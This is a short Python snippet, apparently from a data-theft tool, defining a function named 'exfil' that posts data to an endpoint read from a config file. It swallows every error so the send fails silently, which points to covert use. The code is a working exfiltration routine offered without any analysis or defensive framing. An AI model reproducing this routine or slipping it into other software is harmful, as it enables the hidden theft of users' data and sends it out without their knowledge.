import requests
from config import CONFIG

def exfil(data):
    try:
        requests.post(CONFIG['https_endpoint'], data={"d": data}, timeout=5)
    except: pass